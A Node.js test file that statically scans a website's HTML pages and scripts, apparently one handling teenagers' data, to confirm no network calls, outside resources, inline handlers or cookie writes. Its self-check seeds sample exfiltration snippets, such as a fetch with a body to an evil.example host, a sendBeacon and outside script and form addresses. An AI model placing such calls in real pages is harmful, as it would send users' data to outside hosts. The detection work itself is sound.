// No teen data leaves the browser: a static scan of every root *.html, every assets/js/*.js and every inline script.
// Plain file reads, regular expressions and jsdom parsing (no page script runs, no network). Run with:
//   node --test tests/r1-tests-7-no-egress.test.mjs
//
// What it checks:
// - no script, stylesheet link, img, iframe, source or form action points to an outside http(s) or protocol-relative address
// - no fetch, XMLHttpRequest, sendBeacon, WebSocket, EventSource, dynamic import(), new Image, navigator.mediaDevices
//   or outside .src assignment in assets/js or an inline script
// - every fetch reads a relative data/ file that exists (a variable must be traced to a data/ literal on its own assignment line)
// - no inline event handler attributes (onclick and similar), except the known form handlers listed below
// - no document.cookie writes in assets/js or inline scripts
//
// Known hits are listed with a reason. Any other hit fails. A listed entry that no longer matches a real hit also fails,
// so it gets removed once the source is fixed.
import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { JSDOM } from "jsdom";

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const ROOT_HTML = fs.readdirSync(ROOT).filter((f) => f.endsWith(".html")).sort();
const JS_FILES = fs.readdirSync(path.join(ROOT, "assets/js")).filter((f) => f.endsWith(".js")).sort().map((f) => "assets/js/" + f);
const read = (f) => fs.readFileSync(path.join(ROOT, f), "utf8");

// Absolute addresses the scan allows. Only the site's own public address, which pages use in links a reader opens.
// No script, stylesheet, image or frame may load from it.
const ALLOW_URL_PREFIXES = [
  { prefix: "https://vadneyk.github.io/internships/", why: "the site's own public address, used only in links a reader opens" },
];

// Inline event handler attributes that are known and accepted: { file, attr, why }. None today.
// The Content-Security-Policy meta tag blocks them, so the form handlers moved to a submit listener in assets/js/common.js.
const KNOWN_HANDLER_HITS = [];

// Script hits that are known and accepted: { file, match, why }. None today.
const KNOWN_JS_HITS = [];

// Attributes that make the browser load or submit something, by element.
const URL_ATTRS = [
  { sel: "script[src]", attr: "src" },
  { sel: "link[href]", attr: "href", keep: (el) => /\b(stylesheet|preload|modulepreload)\b/i.test(el.getAttribute("rel") || "") },
  { sel: "img[src]", attr: "src" },
  { sel: "iframe[src]", attr: "src" },
  { sel: "source[src]", attr: "src" },
  { sel: "form[action]", attr: "action" },
];

// Calls and assignments that send data or reach outside the page. fetch() is handled separately (see checkFetchArg).
const TOKEN_RULES = [
  { re: /\b(XMLHttpRequest|sendBeacon|WebSocket|EventSource)\b/, why: "network API" },
  { re: /\bimport\s*\(/, why: "dynamic import()" },
  { re: /\bnavigator\s*\.\s*mediaDevices\b/, why: "camera or microphone access" },
  { re: /\bnew\s+Image\b/, why: "image request (new Image)" },
  { re: /\.src\s*=\s*["'`]\s*(?:[a-z][a-z0-9+.-]*:|\/\/)/i, why: "script sets an outside src" },
  { re: /\bdocument\s*\.\s*cookie\s*=(?!=)/, why: "cookie write" },
];

const isOutside = (v) => v != null && /^\s*(?:[a-z][a-z0-9+.-]*:|\/\/)/i.test(v);
const allowedUrl = (v) => ALLOW_URL_PREFIXES.some((a) => v.trim().startsWith(a.prefix));

// A data path must be relative, under data/, free of "..", and an existing file.
// One picture file is allowed too: the Map page fetches its own map drawing (2026-10-15) to put dots on it.
const FETCHED_PICTURES = ["assets/img/us-states.svg"];
function checkDataPath(p) {
  if (FETCHED_PICTURES.includes(p) && fs.existsSync(path.join(ROOT, p))) return { ok: true, path: p };
  if (!p.startsWith("data/")) return { ok: false, why: `"${p}" is not a relative data/ path` };
  if (p.includes("..") || p.includes("://") || p.startsWith("//")) return { ok: false, why: `"${p}" escapes data/` };
  if (!fs.existsSync(path.join(ROOT, p))) return { ok: false, why: `"${p}" does not exist` };
  return { ok: true, path: p };
}

// Traces a variable to a data/ literal on its own assignment line.
function traceVariable(id, text) {
  const assign = new RegExp(`\\b${id.replace(/\$/g, "\\$")}\\s*=(?!=)`);
  const line = text.split("\n").find((l) => assign.test(l) && /["'`]data\//.test(l));
  if (!line) return { ok: false, why: `variable ${id} is not assigned a data/ path on its assignment line` };
  const lit = /["'`](data\/[^"'`]*)["'`]/.exec(line);
  return lit ? checkDataPath(lit[1]) : { ok: false, why: `variable ${id} has no data/ literal` };
}

// arg is the text after "fetch(" with leading spaces removed.
function checkFetchArg(arg, text) {
  // G.dataUrl(x) only adds ?v=<build hash> to a relative path, so check what is inside. The helper's own
  // fetch(G.dataUrl(path)) has no literal; every caller of G.fetchData is checked below.
  if (arg.startsWith("G.dataUrl(")) {
    const inner = arg.slice("G.dataUrl(".length).trimStart();
    if (/^path\s*\)/.test(inner)) return { ok: true, path: null };
    return checkFetchArg(inner, text);
  }
  // The helper's own fetch(path, ...) in common.js: the same rule, every caller of G.fetchData is checked.
  if (/^path\s*[,)]/.test(arg) && /G\.fetchData\s*=\s*function\s*\(path\)/.test(text)) return { ok: true, path: null };
  const q = arg[0];
  if (q === '"' || q === "'") {
    const end = arg.indexOf(q, 1);
    return end < 0 ? { ok: false, why: "unterminated string" } : checkDataPath(arg.slice(1, end));
  }
  if (q === "`") {
    const end = arg.indexOf("`", 1);
    const lit = end < 0 ? arg.slice(1) : arg.slice(1, end);
    if (!lit.includes("${")) return checkDataPath(lit);
    const prefix = lit.split("${")[0];
    return prefix.startsWith("data/") && !prefix.includes("..") ? { ok: true, path: prefix + "(dynamic)" } : { ok: false, why: "template literal does not start with data/" };
  }
  const id = /^([A-Za-z_$][\w$]*)\s*[,)]/.exec(arg);
  if (id) return traceVariable(id[1], text);
  return { ok: false, why: "argument is not a literal or a traced variable" };
}

// Scans JavaScript text line by line. Returns the hits and the data/ files the fetch calls load.
function scanJs(file, text) {
  const hits = [];
  const loads = [];
  text.split("\n").forEach((line, i) => {
    const where = { file, line: i + 1, text: line.trim().slice(0, 160) };
    for (const r of TOKEN_RULES) if (r.re.test(line)) hits.push({ ...where, why: r.why });
    const re = /\b(?:fetch|G\s*\.\s*fetchData)\s*\(/g;
    let m;
    while ((m = re.exec(line))) {
      const res = checkFetchArg(line.slice(m.index + m[0].length).trimStart(), text);
      if (res.ok) { if (res.path) loads.push(res.path); }
      else hits.push({ ...where, why: "fetch: " + res.why });
    }
  });
  return { hits, loads };
}

// Parses an HTML page with jsdom (scripts do not run). Returns outside URLs, inline handler attributes and inline script bodies.
function scanHtml(file, html) {
  const doc = new JSDOM(html).window.document;
  const urlHits = [];
  for (const { sel, attr, keep } of URL_ATTRS) {
    for (const el of doc.querySelectorAll(sel)) {
      if (keep && !keep(el)) continue;
      const v = el.getAttribute(attr);
      if (isOutside(v) && !allowedUrl(v)) urlHits.push({ file, where: `<${el.tagName.toLowerCase()} ${attr}>`, why: `outside address ${v.trim().slice(0, 120)}` });
    }
  }
  const handlerHits = [];
  for (const el of doc.querySelectorAll("*")) {
    for (const a of el.attributes) {
      if (/^on/i.test(a.name)) handlerHits.push({ file, attr: a.name.toLowerCase(), where: `<${el.tagName.toLowerCase()} ${a.name}>`, why: "inline event handler attribute" });
    }
  }
  const inline = [...doc.querySelectorAll("script:not([src])")].map((s, i) => ({ text: s.textContent, label: `${file} inline script ${i + 1}` }));
  return { urlHits, handlerHits, inline };
}

const fmt = (h) => `${h.file} ${h.where || "line " + h.line}: ${h.why}${h.text ? " | " + h.text : ""}`;

test("no root page loads a script, style, image or frame from an outside address, or submits to one", () => {
  const hits = ROOT_HTML.flatMap((f) => scanHtml(f, read(f)).urlHits);
  assert.equal(hits.length, 0, "outside addresses:\n" + hits.map(fmt).join("\n"));
});

test("no inline event handler attributes except the known form handlers", () => {
  const raw = ROOT_HTML.flatMap((f) => scanHtml(f, read(f)).handlerHits);
  const unknown = raw.filter((h) => !KNOWN_HANDLER_HITS.some((k) => k.file === h.file && k.attr === h.attr));
  assert.equal(unknown.length, 0, "inline event handlers:\n" + unknown.map(fmt).join("\n"));
  for (const k of KNOWN_HANDLER_HITS) {
    assert.ok(raw.some((h) => h.file === k.file && h.attr === k.attr), `known entry no longer matches a real hit: ${k.file} ${k.attr}`);
  }
});

test("assets/js and inline scripts make no network, media, import or cookie-write calls", () => {
  const raw = [];
  for (const f of JS_FILES) raw.push(...scanJs(f, read(f)).hits);
  for (const f of ROOT_HTML) {
    for (const s of scanHtml(f, read(f)).inline) raw.push(...scanJs(s.label, s.text).hits);
  }
  const unknown = raw.filter((h) => !KNOWN_JS_HITS.some((k) => h.file.startsWith(k.file) && h.text.includes(k.match)));
  assert.equal(unknown.length, 0, "script hits:\n" + unknown.map(fmt).join("\n"));
  for (const k of KNOWN_JS_HITS) {
    assert.ok(raw.some((h) => h.file.startsWith(k.file) && h.text.includes(k.match)), `known entry no longer matches a real hit: ${k.file} ${k.match}`);
  }
});

test("every fetch reads a relative data/ file that exists", () => {
  const loads = [];
  const bad = [];
  for (const f of JS_FILES) {
    const r = scanJs(f, read(f));
    loads.push(...r.loads);
    bad.push(...r.hits.filter((h) => h.why.startsWith("fetch:")));
  }
  for (const f of ROOT_HTML) {
    for (const s of scanHtml(f, read(f)).inline) {
      const r = scanJs(s.label, s.text);
      loads.push(...r.loads);
      bad.push(...r.hits.filter((h) => h.why.startsWith("fetch:")));
    }
  }
  assert.ok(loads.length > 0, "expected the pages to load data/ files");
  assert.equal(bad.length, 0, "fetch calls that do not read data/:\n" + bad.map(fmt).join("\n"));
});

test("no cookie writes in assets/js", () => {
  const hits = JS_FILES.flatMap((f) => scanJs(f, read(f)).hits).filter((h) => h.why === "cookie write");
  assert.equal(hits.length, 0, "cookie writes:\n" + hits.map(fmt).join("\n"));
});

test("self-check: the scanner flags seeded bad snippets and passes a clean one", () => {
  const js = scanJs(
    "seed.js",
    [
      'fetch("https://evil.example/c", { body: x });',
      "navigator.sendBeacon(\"/t\", d);",
      'document.cookie = "id=1";',
      "fetch(url);",
      'const s = new WebSocket("wss://x");',
      'fetch("data/gaps.json");',
      'import("./m.js");',
    ].join("\n")
  );
  assert.equal(js.hits.length, 6, "expected six seeded hits, got:\n" + js.hits.map(fmt).join("\n"));
  assert.equal(js.loads.length, 1, "expected the clean data/ fetch to pass");

  const html = scanHtml(
    "seed.html",
    '<script src="https://cdn.evil.example/x.js"></script><img src="https://t.example/p.gif"><iframe src="//evil.example/f"></iframe>' +
      '<form action="https://evil.example/s"></form><link rel="stylesheet" href="https://fonts.evil.example/c.css">' +
      '<div onclick="x()"></div><script>fetch("https://e.example")</script><img src="assets/img/swoosh.svg">'
  );
  assert.equal(html.urlHits.length, 5, "expected five outside URLs, got " + html.urlHits.length);
  assert.equal(html.handlerHits.length, 1, "expected one inline handler");
  assert.equal(html.inline.length, 1, "expected one inline script");
  assert.equal(scanJs("seed inline", html.inline[0].text).hits.length, 1, "expected the inline outside fetch to be flagged");
});
